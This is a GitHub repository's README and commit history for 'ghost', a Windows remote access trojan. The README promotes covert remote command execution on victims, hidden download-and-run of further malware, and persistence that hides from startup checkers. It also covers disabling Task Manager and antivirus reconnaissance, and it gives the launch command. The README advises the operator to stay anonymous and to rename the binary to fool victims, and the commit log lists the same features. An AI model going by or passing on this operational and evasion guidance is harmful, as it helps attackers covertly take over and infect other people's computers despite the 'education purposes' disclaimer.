@@ -1,0 +1,159 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+# ghost
+
+<p align="center">
+	<img src="https://i.imgur.com/NDCXXgD.jpg" />
+</p>
+
+---
+
+**ghost** is a light [RAT](http://searchsecurity.techtarget.com/definition/RAT-remote-access-Trojan) that gives the server/attacker full remote access to the user's command-line interpreter (cmd.exe).
+They are allowed to execute commands silently without the client/zombie noticing. The server/attacker is also given the ability to download and execute files on the client/zombie's computer. This is also
+a silent and hidden process. Like most Remote Access Trojans, this download and execution ability helps distribute viruses and other pieces of malware.
+
+This malware is distributed simply by running *zombie.exe*. This file name can be changed to whatever. There is no restriction. When run, it searches for the first two arguments (IP & Port). If neither
+is provided, the program doesn't run. With that being said, make sure you provide the server's IP and Port in the command-line arguments. Example:
+
+```
+zombie.exe 127.0.0.1 27015
+```
+
+#### Bot Features
+
+- Remote command execution 
+- Silent background process
+- Download and run file (Hidden)
+- Safe Mode startup
+- Will automatically connect to the server
+- Data sent and received is encrypted (substitution cipher)
+- Files are hidden
+- Installed Antivirus shown to server
+- Easily spread malware through download feature
+- Startup info doesn't show in msconfig or other startup checking programs like CCleaner
+- Disable Task Manager
+
+---
+
+When successfully started, it adds itself to the start-up pool and runs silently in the background. It will try to repeatedly connect to the server. This process does not hog any memory or CPU usage.
+This means that the zombie will silently just idle in the background and whenever the server is up, it will automatically connect.
+
+<p align="center">
+	<img src="https://i.imgur.com/W5aC6rg.png" />
+</p>
+
+When starting the server, it will prompt for you a listening port. This is the port that you need to use in the command-line for zombie.exe. Once you provide the port, your server information will be
+provided and the menu will be down. The IP address provided is your external IP. With that being said, unless the client/zombie is actively looking and tracking open connections, it will probably be 
+smart to run this server under a remote location if you want to stay anonymous. If this does not interest you, simply renaming zombie.exe and/or changing the assembly information using a tool will 
+likely fool the client/zombie.
+
+**Note**: This project was only made for education purposes and to test out my recently published repositories ([ahxrlogger](https://github.com/AHXR/ahxrlogger) & [ahxrsocket](https://github.com/AHXR/ahxrwinsocket)). If you choose to use this for malicious reasons, you are completely responsible for the outcome.====================== GIT HISTORY: ======================
+8ebc942 HEAD@{0}: clone: from https://github.com/AHXR/ghost
+commit 8ebc94293e961d7e94fb93346c564cada6ef35ec
+Author: a <iCodedAndre@gmail.com>
+Date:   Sun Jan 21 12:01:33 2018 -0500
+
+    Fixed Debug Mode
+
+commit 1c2ed829eaf922eee3996452324bb7f306e13d62
+Author: a <iCodedAndre@gmail.com>
+Date:   Sun Jan 21 11:58:14 2018 -0500
+
+    Added iniReader
+
+commit b9dd96cc42ef39596d94d5e04f50970ebd27bdbd
+Author: a <iCodedAndre@gmail.com>
+Date:   Sun Jan 21 11:51:39 2018 -0500
+
+    1.0.4
+    
+    - Task Manager Killer added
+    - Commands automatically timeout
+    - Cleaned up and organized some modules
+
+commit 901a49e3c981ab3f23f3744e8bdbaa4df4b90681
+Author: a <iCodedAndre@gmail.com>
+Date:   Sun Dec 17 19:58:27 2017 -0500
+
+    Cleaned
+
+commit d993cc073aee726b03f16818a4fd70b980d475a7
+Author: a <iCodedAndre@gmail.com>
+Date:   Sun Dec 17 19:41:39 2017 -0500
+
+    MD
+
+commit daa825de8323b5073dd6c4dcdbc5ac4e58c7c80f
+Author: a <iCodedAndre@gmail.com>
+Date:   Sun Dec 17 19:39:53 2017 -0500
+
+    1.0.3b
+    
+    - Refresh crashing fixed
+    - Zombie's version of ghost now shown
+    - Now starts up in Safe Mode. (Administrator Privileges Required)
+    - Hidden from startup checkers such as CCleaner and msconfig
+    (Administrator Privileges Required)
+
+commit 85579a2173bdb88d470252c3c1d5b058088568e8
+Author: a <iCodedAndre@gmail.com>
+Date:   Sun Dec 17 13:32:36 2017 -0500
+
+    1.0.3
+    
+    - Fixed zombie not responding to commands
+    - IRC is now encrypted (substitution cipher)
+
+commit d69f846ce7401f031ae58343717d65658a5d0d1b
+Author: a <iCodedAndre@gmail.com>
+Date:   Tue Dec 12 11:42:28 2017 -0500
+
+    1.0.2
+    
+    1.0.2 (12/12/2017)
+    
+    - Fixed repeated commands
+    - Windows version now shown
+    - Username of client now shown
+    - Antivirus shown
+
+commit fd00bbbf760696596d8ff073e82dd81e17aa9233
+Author: a <iCodedAndre@gmail.com>
+Date:   Tue Dec 12 08:10:46 2017 -0500
+
+    1.0.1
+    
+    - Fixed incorrect CHANGELOG.md
+    - Fixed zombie not automatically reconnecting to server
+    - Server now has the ability to save/load configuration (**ghost.conf**)
+    - Fixed zombie not closing TCP connection.
+
+commit d97b1cab2bdab33bc33e296220f40fc51c937c1a
+Author: a <iCodedAndre@gmail.com>
+Date:   Sun Dec 10 12:41:50 2017 -0500
+
+    Precompiled Headers Removed
+
+commit d1624a6f8c9ad52ee5d84dd51635799945e37b38
+Author: a <iCodedAndre@gmail.com>
+Date:   Sat Dec 9 13:51:48 2017 -0500
+
+    MD
+
+commit 25d98f3c6a93b6f48b8cb01a83237d60ca5e23bd
+Author: a <iCodedAndre@gmail.com>
+Date:   Sat Dec 9 13:46:47 2017 -0500
+
+    MD
+
+commit 63d5cec6da28ffc2d1237119369006030ec671a5
+Author: a <iCodedAndre@gmail.com>
+Date:   Sat Dec 9 13:45:19 2017 -0500
+
+    1.0
+
+commit 9fbeb405450e7293689e8c77ac7873884eab160d
+Author: a <iCodedAndre@gmail.com>
+Date:   Sat Dec 9 13:41:58 2017 -0500
+
+    :lollipop: Added .gitattributes & .gitignore files
